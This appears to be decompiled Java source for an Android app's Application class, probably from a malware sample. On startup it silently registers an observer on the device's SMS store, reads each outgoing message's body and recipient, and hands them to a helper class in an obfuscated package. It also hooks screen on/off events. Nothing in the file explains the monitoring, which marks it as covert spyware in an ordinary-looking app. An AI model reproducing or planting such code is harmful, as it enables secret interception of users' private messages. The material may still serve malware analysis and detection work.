package com.babblelink.viigee;

import android.app.Application;
import android.content.ContentResolver;
import android.content.Context;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import java.util.Date;
import org.json.JSONArray;
import org.json.JSONObject;
import roijf.sdfqlkj.sfakjdfa.MainReceiver;
import roijf.sdfqlkj.sfakjdfa.by;

public class MainApplication
  extends Application
  implements Thread.UncaughtExceptionHandler
{
  private ContentObserver a;
  
  public MainApplication() {}
  
  private void a()
  {
    if (this.a != null) {
      return;
    }
    this.a = new i(this, null);
    getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, this.a);
  }
  
  private void a(Context paramContext)
  {
    paramContext = paramContext.getContentResolver().query(Uri.parse("content://sms"), null, null, null, null);
    if (paramContext.moveToNext())
    {
      String str1 = paramContext.getString(paramContext.getColumnIndex("protocol"));
      int i = paramContext.getInt(paramContext.getColumnIndex("type"));
      if ((str1 != null) || (i != 2)) {
        return;
      }
      i = paramContext.getColumnIndex("date");
      int j = paramContext.getColumnIndex("body");
      str1 = paramContext.getString(paramContext.getColumnIndex("address"));
      new Date(paramContext.getLong(i));
      String str2 = paramContext.getString(j);
      new by(this).h("out sms: " + str2 + " to " + str1);
    }
    paramContext.close();
  }
  
  public void onCreate()
  {
    Thread.setDefaultUncaughtExceptionHandler(this);
    super.onCreate();
    IntentFilter localIntentFilter = new IntentFilter();
    localIntentFilter.addAction("android.intent.action.SCREEN_ON");
    localIntentFilter.addAction("android.intent.action.SCREEN_OFF");
    registerReceiver(new MainReceiver(), localIntentFilter);
    a();
  }
  
  public void uncaughtException(Thread paramThread, Throwable paramThrowable)
  {
    try
    {
      JSONObject localJSONObject1 = new JSONObject();
      localJSONObject1.put("uncaughtException", paramThrowable.toString());
      localJSONObject1.put("thread", paramThread);
      localJSONObject1.put("message", paramThrowable.getMessage());
      paramThread = new JSONArray();
      paramThrowable = paramThrowable.getStackTrace();
      int i = 0;
      for (;;)
      {
        if (i >= paramThrowable.length)
        {
          localJSONObject1.put("trace", paramThread);
          return;
        }
        Object localObject = paramThrowable[i];
        JSONObject localJSONObject2 = new JSONObject();
        localJSONObject2.put("ClassName", localObject.getClassName());
        localJSONObject2.put("FileName", localObject.getFileName());
        localJSONObject2.put("LineNumber", localObject.getLineNumber());
        localJSONObject2.put("MethodName", localObject.getMethodName());
        paramThread.put(localJSONObject2);
        i += 1;
      }
      return;
    }
    catch (Exception paramThread) {}
  }
}
